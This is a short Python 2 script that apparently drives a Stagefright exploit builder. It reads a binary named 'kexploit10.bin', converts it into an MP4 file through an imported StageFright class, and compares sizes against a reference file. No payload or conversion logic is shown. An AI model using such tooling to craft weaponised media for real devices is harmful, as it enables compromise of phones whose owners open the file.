import os
from CLASS_StageFright import StageFright

working_directory = os.path.dirname(os.path.realpath(__file__))

inputfile = os.path.join(working_directory, 'bin', 'kexploit10.bin')
outputfile = os.path.join(working_directory, 'mp4', 'test.mp4')
correctfile = os.path.join(working_directory, 'mp4', 'correct.mp4')

inputdata = bytearray(os.path.getsize(inputfile))
with open(inputfile, 'rb') as f:
    f.readinto(inputdata)

correctdata = bytearray(os.path.getsize(correctfile))
with open(correctfile, 'rb') as f:
    f.readinto(correctdata)

stage = StageFright(inputdata)
output = stage.convert()

with open(outputfile, "wb") as f:
    f.write(output)

print "Input size: " + str(len(inputdata)) + ' bytes'
print "Output size: " + str(len(output)) + ' bytes'
print "Correction model size: " + str(len(correctdata)) + ' bytes'
